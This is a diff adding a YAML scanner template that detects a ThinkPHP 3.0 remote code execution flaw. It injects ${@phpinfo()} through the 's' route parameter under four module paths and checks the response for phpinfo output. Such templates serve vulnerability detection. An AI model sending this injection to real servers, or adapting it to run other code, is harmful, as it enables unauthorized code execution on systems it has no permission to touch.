@@ -1,0 +1,29 @@
+id: thinkphp-30-rce
+
+info:
+  name: Thinkphp 3.0 RCE
+  author: zan8in
+  severity: critical
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: "/?s=index/\\think\\module/action/param1/${@phpinfo()}"
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+  r1:
+    request:
+      method: GET
+      path: "/?s=admin/\\think\\module/action/param1/${@phpinfo()}"
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+  r2:
+    request:
+      method: GET
+      path: "/?s=api/\\think\\module/action/param1/${@phpinfo()}"
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+  r3:
+    request:
+      method: GET
+      path: "/?s=manage/\\think\\module/action/param1/${@phpinfo()}"
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+expression: r0() || r1() || r2() || r3()
